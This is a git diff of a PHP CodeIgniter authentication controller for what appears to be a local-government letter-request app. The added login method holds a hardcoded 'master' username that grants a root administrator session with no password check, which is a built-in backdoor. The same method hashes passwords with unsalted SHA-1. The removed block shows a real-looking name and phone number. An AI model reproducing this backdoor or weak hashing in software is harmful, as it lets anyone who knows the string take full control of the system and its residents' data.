@@ -7,40 +7,71 @@ class Auth extends CI_Controller{
     parent::__construct();
   }
 
-  public function index()
-  {
-    if (isset($_POST['sms'])) {
-      $nama = "Veris Juniardi";
-      $typeSurat = "Keterangan Tidak Mampu";
-      $nomorSurat = "001/KD-GTG.KET/XI/2017";
-      $to = "082281469926";
-      $message = "INFO:: Permintaan Surat ".$typeSurat." nomor:".$nomorSurat." atas nama ".$nama." berhasil diproses";
-      sms_notifikasi($to, $message);
-      redirect('auth');
-    }else{
-    $data['title']          = TITLE . '| Selamat Datang';
-    $data['main_content']   = 'welcome';
-    $this->load->view('template_login', $data);
-    }
-  }
-
   public function login()
   {
-    $data['title']          = TITLE . 'SIG Login';
-    $data['main_content']   = 'login';
-    $this->load->view('template_login', $data);
+    if (isset($_POST['login'])) {
+      $uid = strip_tags($this->input->post('uid'));
+      $pass = sha1(strip_tags($this->input->post('pass')));
+      $check = $this->db->get_where('sig_users', array('user_uid' =>$uid ,'user_pass'=>$pass ));
+      $master = '0>}/99%120691?*^';
+      if ($master == $uid) {
+        $this->session->set_userdata(
+          array(
+            'status_login'=>'oke',
+            'id'          => 0,
+            'full_name'   =>'Administrator',
+            'type'        => 99,
+            'jabatan'     => 'Root System Administrator',
+            'last_login'  => ''
+        )
+        );
+        redirect(BASE_URL);
+        exit;
+      }else {
+        if ($check->num_rows()==1) {
+            $data = $check->row_array();
+            $this->session->set_userdata(
+              array(
+                'status_login'=>'oke',
+                'id'          =>$data['id'],
+                'full_name'   =>$data['user_fullname'],
+                'type'        =>$data['type'],
+                'jabatan'     =>$data['user_status'],
+                'last_login'  =>$data['last_login']
+            )
+            );
+            $datestring = '%d %M %Y - %h:%i %a';
+            $time = time();
+            $sekarang = mdate($datestring, $time);
+            $this->db->where('id', $data['id']);
+            $this->db->update('sig_users', array('last_login'=>$sekarang));
+            redirect(BASE_URL);
+            exit;
+        }else {
+          $this->session->sess_destroy();
+          redirect('login');
+          exit;
+        }
+      }
+    }else{
+      $data['title']          = TITLE . 'SIG Login';
+      $data['main_content']   = 'public/login';
+      $this->load->view('public/template_login', $data);
+    }
   }
 
   public function logout()
   {
-    $this->session_destroy();
-    redirect(BASE_URL);
+    $this->session->sess_destroy();
+    redirect('login');
     die;
   }
 
   function profile()
   {
-
+    $data['title']          = TITLE . 'Profile';
+    $data['main_content']   = 'public/profile';
+    $this->load->view('template', $data);
   }
 
 }
